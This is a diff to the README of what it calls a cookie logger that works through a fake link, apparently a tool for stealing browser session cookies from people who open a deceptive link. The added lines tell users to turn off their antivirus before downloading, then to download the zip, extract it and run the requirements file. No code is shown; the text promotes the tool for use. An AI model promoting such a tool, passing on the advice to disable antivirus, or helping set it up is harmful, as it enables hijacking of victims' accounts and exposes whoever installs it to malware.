@@ -1,5 +1,10 @@
 # This Is The Best Cookie Logger That Uses A Fake Link
 
+# Before The Steps Turn Off Antivirus Or The File Will Come Out With An ERROR Or Failed To Download Potential Virus Something Like That
+
+# Sorry About the Gui It looks Ugly
+
+# STEPS BELOW
 Step 1; Download Zip and extract
 
 Step 2; Run the requirements file and wait until it finishes and installs all requirements
